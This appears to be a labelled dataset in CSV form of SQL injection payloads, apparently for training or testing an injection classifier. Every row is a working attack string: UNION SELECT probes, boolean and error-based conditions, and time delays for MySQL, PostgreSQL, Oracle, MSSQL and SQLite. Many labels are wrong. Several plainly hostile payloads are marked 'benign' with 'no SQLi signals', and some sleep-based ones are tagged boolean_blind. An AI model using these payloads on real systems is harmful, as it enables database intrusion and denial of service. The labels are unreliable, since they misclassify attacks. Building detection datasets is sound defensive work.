id,payload_inner,sqli_type,db_engine,confidence,reasoning,sources_agree
21474,"1' ) ) ) or 8514 = benchmark ( 5000000,md5 ( 0x544d5a4c ) ) #",boolean_blind,mysql,0.85,'OR N=...' boolean condition; DB signature: mysql; conditional True/False branch execution,1
21475,1' ) and 8594 = ( select 8594 from pg_sleep ( 5 ) ) --,boolean_blind,postgresql,0.95,'AND N=...' boolean condition; DB signature: postgresql,2
21476,"1"" where 5552 = 5552 or 5356 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",boolean_blind,generic,1.0,'OR N=...' boolean condition; conditional True/False branch execution,3
21477,1'+ ( select 'wpnm' where 8223 = 8223 and 6240 = ( 'qqpjq'|| ( select case 6240 when 6240 then 1 else 0 end from rdb$database ) ||'qzvzq' ) ) +',boolean_blind,generic,1.0,'AND N=...' boolean condition; conditional True/False branch execution,3
21478,"1' ) ) ( select ( case when ( 4587 = 4587 ) then regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) else char ( 76 ) ||char ( 65 ) ||char ( 102 ) ||char ( 72 ) end ) from ( values ( 0 ) ) ) and ( ( 'qeet' = 'qeet",benign,generic,1.0,No SQLi injection signals detected; valid SQL syntax without boolean expressions or meta-access patterns,1
21479,"-5826"" ) ) union all select 7192,7192#",union_based,generic,1.0,'UNION SELECT' clause; column count validation required,3
21480,"-9959"" ) where 7073 = 7073 union all select 7073,7073,7073,7073,7073,7073,7073,7073#",union_based,generic,1.0,'UNION SELECT' clause; column count validation required,3
21481,"-6381%"" ) ) ) union all select 1503,1503,1503,1503#",union_based,generic,1.0,'UNION SELECT' clause; column count validation required,3
21482,1' and 7533 = 7533 and 'clqy' like 'clqy,boolean_blind,generic,1.0,'AND N=...' boolean condition; conditional True/False branch execution,3
21483,"1'+ ( select 'rguk' where 6019 = 6019 union all select null,null,null,null,null--",union_based,generic,1.0,'UNION SELECT' clause; column count validation required,3
21484,"1%"" ) or 5286 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) and ( ""%"" = """,boolean_blind,generic,1.0,'OR N=...' boolean condition; conditional True/False branch execution,3
21485,-5286' or 6783 = 1233,boolean_blind,generic,1.0,'OR N=...' boolean condition; conditional True/False branch execution,3
21486,"1%"" ) and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 6237 = 6237,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x ) and ( ""%"" = """,boolean_blind,generic,0.95,Pattern: boolean_blind; conditional True/False branch execution,2
21487,"1' ) and ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 3484 = 3484,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) and ( 'xonc' = 'xonc",boolean_blind,generic,0.95,Pattern: boolean_blind; conditional True/False branch execution,2
21488,1 waitfor delay '0:0:5'# opyp,time_blind,mssql,1.0,'WAITFOR DELAY' MSSQL timing; DB signature: mssql; time-delay observable in response timing,3
21489,"1' ) and 8148 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",boolean_blind,sqlite,0.85,'AND N=...' boolean condition; DB signature: sqlite,1
21490,1'|| ( select 'xugb' from dual where 6772 = 6772,benign,generic,1.0,No SQLi injection signals detected; valid SQL syntax without boolean expressions or meta-access patterns,1
21491,"1"" union all select null,null,null,null,null,null,null,null,null--",union_based,generic,1.0,'UNION SELECT' clause; column count validation required,3
21492,-8163 ) ) as cvai where 2360 = 2360 or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --,boolean_blind,generic,1.0,'OR N=...' boolean condition; conditional True/False branch execution,3
21493,1 ) where 1079 = 1079,benign,generic,1.0,No SQLi injection signals detected; valid SQL syntax without boolean expressions or meta-access patterns,2
21494,"1"" and ( 7424 = 2381 ) *2381 and ""dvju"" = ""dvju",boolean_blind,generic,0.95,Pattern: boolean_blind; conditional True/False branch execution,2
21495,1'+ ( select 'vtyw' where 7950 = 7950 order by 1--,benign,generic,1.0,No SQLi injection signals detected; valid SQL syntax without boolean expressions or meta-access patterns,1
21496,"1"" ) ) as paep where 8947 = 8947 and ( select 9067 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9067 = 9067,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) --",boolean_blind,generic,0.95,Pattern: boolean_blind; conditional True/False branch execution,2
21497,1 and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) # sipo,boolean_blind,oracle,0.95,'AND N=...' boolean condition; DB signature: oracle,2
21498,"1 ( select ( case when ( 5451 = 5451 ) then regexp_substring ( repeat ( right ( char ( 5451 ) ,0 ) ,500000000 ) ,null ) else char ( 108 ) ||char ( 76 ) ||char ( 112 ) ||char ( 116 ) end ) from information_schema.system_users ) # ujdg",benign,generic,1.0,No SQLi injection signals detected; valid SQL syntax without boolean expressions or meta-access patterns,1
21499,"1"" ) ) and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and ( ( ""qnqb"" like ""qnqb",boolean_blind,oracle,0.95,'AND N=...' boolean condition; DB signature: oracle,2
21500,1'+ ( select 'jmdl' where 7827 = 7827,benign,generic,1.0,No SQLi injection signals detected; valid SQL syntax without boolean expressions or meta-access patterns,1
21501,1 ) as qwsa where 2874 = 2874,benign,generic,1.0,No SQLi injection signals detected; valid SQL syntax without boolean expressions or meta-access patterns,2
21502,1' ) ) and 7230 = 2517,boolean_blind,generic,1.0,'AND N=...' boolean condition; conditional True/False branch execution,3
21503,1' ) where 8291 = 8291,benign,generic,1.0,No SQLi injection signals detected; valid SQL syntax without boolean expressions or meta-access patterns,2
21504,"select like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ""ejmj"" like ""ejmj",time_blind,sqlite,0.95,DB signature: sqlite; time-delay observable in response timing,2
21505,1 ) as ryks where 1196 = 1196,benign,generic,1.0,No SQLi injection signals detected; valid SQL syntax without boolean expressions or meta-access patterns,2
21506,"select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5-- mkoo",benign,generic,1.0,No SQLi injection signals detected; valid SQL syntax without boolean expressions or meta-access patterns,1
21507,1%' ) ) and 7756 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 7756 = 7756 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( ( '%' = ',boolean_blind,generic,1.0,'AND N=...' boolean condition; conditional True/False branch execution,3
21508,"1%"" ) ) ) and sleep ( 5 ) and ( ( ( ""%"" = """,time_blind,generic,0.95,Pattern: time_blind; time-delay observable in response timing,2
21509,"1"" ) where 1416 = 1416 union all select null,null,null#",union_based,generic,1.0,'UNION SELECT' clause; column count validation required,3
21510,"1' ) ) as agdn where 8442 = 8442 and 3824 = benchmark ( 5000000,md5 ( 0x76555642 ) ) --",boolean_blind,mysql,0.85,'AND N=...' boolean condition; DB signature: mysql,1
21511,1 ) where 5025 = 5025,benign,generic,1.0,No SQLi injection signals detected; valid SQL syntax without boolean expressions or meta-access patterns,2
21512,"1%"" ) union all select null,null,null,null,null#",union_based,generic,1.0,'UNION SELECT' clause; column count validation required,3
21513,"1 ) ) ) union all select null,null,null,null,null,null,null,null,null--",union_based,generic,1.0,'UNION SELECT' clause; column count validation required,3
21514,"-2247' ) union all select 1202,1202,1202,1202,1202#",union_based,generic,1.0,'UNION SELECT' clause; column count validation required,3
21515,"1' ) and 8312 = dbms_pipe.receive_message ( chr ( 69 ) ||chr ( 79 ) ||chr ( 101 ) ||chr ( 68 ) ,5 ) --",boolean_blind,oracle,0.85,'AND N=...' boolean condition; DB signature: oracle,1
21516,"1"" and 6637 = 2321",boolean_blind,generic,1.0,'AND N=...' boolean condition; conditional True/False branch execution,3
21517,"select benchmark ( 5000000,md5 ( 0x4c4d6142 ) ) and ( ( ( 'lqwz' = 'lqwz",time_blind,mysql,0.95,'BENCHMARK()' MySQL compute delay; DB signature: mysql,2
21518,"1%' ) ) and 2388 = benchmark ( 5000000,md5 ( 0x6d457153 ) ) #",boolean_blind,mysql,0.85,'AND N=...' boolean condition; DB signature: mysql,1
21519,"-1550%"" ) ) ) order by 1--",benign,generic,1.0,No SQLi injection signals detected; valid SQL syntax without boolean expressions or meta-access patterns,3
21520,"1%' ) ) and elt ( 1210 = 1210,sleep ( 5 ) ) and ( ( '%' = '",boolean_blind,generic,0.95,Pattern: boolean_blind; conditional True/False branch execution,2
21521,"1"" where 7015 = 7015",benign,generic,1.0,No SQLi injection signals detected; valid SQL syntax without boolean expressions or meta-access patterns,2
21522,"1%' ) ) ) and 6414 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) and ( ( ( '%' = '",boolean_blind,generic,1.0,'AND N=...' boolean condition; conditional True/False branch execution,3
21523,-6722' ) order by 1#,benign,generic,1.0,No SQLi injection signals detected; valid SQL syntax without boolean expressions or meta-access patterns,3
21524,"1"" and exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8190 = 8190,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) )",boolean_blind,generic,0.95,Pattern: boolean_blind; conditional True/False branch execution,2
21525,"1"" and 3715 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 3715 = 3715 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ""vziz"" = ""vziz",boolean_blind,generic,1.0,Pattern: boolean_blind; conditional True/False branch execution,3
21526,"1"" and 8594 = ( select 8594 from pg_sleep ( 5 ) ) --",boolean_blind,postgresql,0.95,'AND N=...' boolean condition; DB signature: postgresql,2
21527,-4835 ) ) ) or ( 4219 = 2081 ) *2081 and ( ( ( 8536 = 8536,benign,generic,1.0,No SQLi injection signals detected; valid SQL syntax without boolean expressions or meta-access patterns,2
21528,"1' ) ) as yyja where 4321 = 4321 or 8315 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",boolean_blind,generic,1.0,'OR N=...' boolean condition; conditional True/False branch execution,3
21529,"select sleep ( 5 ) and ( ( ""%"" = """,time_blind,generic,0.95,Pattern: time_blind; time-delay observable in response timing,2
21530,"1%"" ) ) and 8189 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",boolean_blind,generic,1.0,'AND N=...' boolean condition; conditional True/False branch execution,3
21531,"1 ) or char ( 75 ) ||char ( 70 ) ||char ( 99 ) ||char ( 83 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",benign,generic,1.0,No SQLi injection signals detected; valid SQL syntax without boolean expressions or meta-access patterns,1
21532,"1"" ) where 4038 = 4038 or 4240 = ( select 4240 from pg_sleep ( 5 ) ) --",boolean_blind,postgresql,0.95,'OR N=...' boolean condition; DB signature: postgresql,2
21533,"1"" ) ) and 3715 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 3715 = 3715 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ( ""bcxh"" like ""bcxh",benign,generic,1.0,No SQLi injection signals detected; valid SQL syntax without boolean expressions or meta-access patterns,1
21534,"1' or elt ( 6272 = 6272,sleep ( 5 ) ) and 'fvtf' like 'fvtf",boolean_blind,generic,0.95,Pattern: boolean_blind; conditional True/False branch execution,2
21535,1 where 5443 = 5443,benign,generic,1.0,No SQLi injection signals detected; valid SQL syntax without boolean expressions or meta-access patterns,2
21536,"1"" procedure analyse ( extractvalue ( 5840,concat ( 0x5c,0x7171706a71, ( select ( case when ( 5840 = 5840 ) then 1 else 0 end ) ) ,0x717a767a71 ) ) ,1 )",error_based,mysql,0.95,'extractvalue()' XPath error; DB signature: mysql; database error message analysis method,2
21537,1 ) as mixt where 1085 = 1085 or sleep ( 5 ) --,time_blind,generic,0.95,Pattern: time_blind; time-delay observable in response timing,2
21538,1' ) ) ) union all select null--,union_based,generic,1.0,'UNION SELECT' clause; column count validation required,3
21539,"1"" ) or ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8113 = 8113,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) and ( ""gcnq"" like ""gcnq",boolean_blind,generic,0.95,Pattern: boolean_blind; conditional True/False branch execution,2
21540,"1'+ ( select 'rpbx' where 6748 = 6748 and elt ( 4249 = 4249,7259 ) ) +'",boolean_blind,generic,1.0,Pattern: boolean_blind; conditional True/False branch execution,3
21541,"-5573' ) union all select 2866,2866,2866,2866,2866,2866,2866,2866,2866--",union_based,generic,1.0,'UNION SELECT' clause; column count validation required,3
21542,"-5810 union all select 6307,6307,6307,6307,6307,6307,6307--",union_based,generic,1.0,'UNION SELECT' clause; column count validation required,3
21543,"1 ) as otsb where 8380 = 8380 or 7427 = dbms_pipe.receive_message ( chr ( 116 ) ||chr ( 87 ) ||chr ( 90 ) ||chr ( 109 ) ,5 ) --",boolean_blind,oracle,0.85,'OR N=...' boolean condition; DB signature: oracle,1
